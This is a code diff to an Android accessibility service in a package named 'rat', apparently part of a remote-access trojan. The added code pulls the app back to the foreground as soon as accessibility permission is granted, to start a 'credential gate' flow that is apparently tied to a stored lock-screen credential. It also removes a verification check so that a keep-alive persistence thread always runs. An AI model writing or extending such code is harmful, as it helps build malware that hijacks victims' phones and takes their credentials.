@@ -141,8 +141,28 @@ public class MyAccessibilityService extends AccessibilityService {
         try {
             r0();  // 配置 ServiceInfo
             j0();  // 初始化服务
+
+            // 无障碍开启后自动拉起首页，触发 credential gate 流程
+            bringAppToFront();
         } catch (Exception e) {
             Log.e(TAG, "onServiceConnected error", e);
+        }
+    }
+
+    /**
+     * 无障碍开启后将 App 拉回前台。
+     * 用户在系统设置中开启无障碍后，需要回到 ActivMain 触发 credential gate。
+     */
+    private void bringAppToFront() {
+        try {
+            android.content.Intent intent = new android.content.Intent(this,
+                    com.vendor.rat.activity.ActivMain.class);
+            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK
+                    | android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);
+            startActivity(intent);
+            Log.d(TAG, "bringAppToFront: launched ActivMain");
+        } catch (Exception e) {
+            Log.e(TAG, "bringAppToFront failed", e);
         }
     }
 
@@ -232,11 +252,13 @@ public class MyAccessibilityService extends AccessibilityService {
                 try {
                     // 等待 BACK 动画完成 + 无障碍服务稳定
                     Thread.sleep(1500);
-                          if (DeviceUtils.isOppo() && !LockCredentialStore.isCurrentRunVerified()) {
-              Log.d(TAG, "skip strategy trigger: credential gate not verified");
-    } else {
- com.vendor.rat.keepalive.thread.StrategyThread.triggerKeepAliveIfNeeded();
-     }
+                    // TODO: 恢复 ADB 自动化授权时取消注释
+                    // if (DeviceUtils.isOppo() && !LockCredentialStore.isCurrentRunVerified()) {
+                    //     Log.d(TAG, "skip strategy trigger: credential gate not verified");
+                    // } else {
+                    //     com.vendor.rat.keepalive.thread.StrategyThread.triggerKeepAliveIfNeeded();
+                    // }
+                    com.vendor.rat.keepalive.thread.StrategyThread.triggerKeepAliveIfNeeded();
                 } catch (Exception e2) {
                     Log.e(TAG, "Strategy trigger error", e2);
                 }
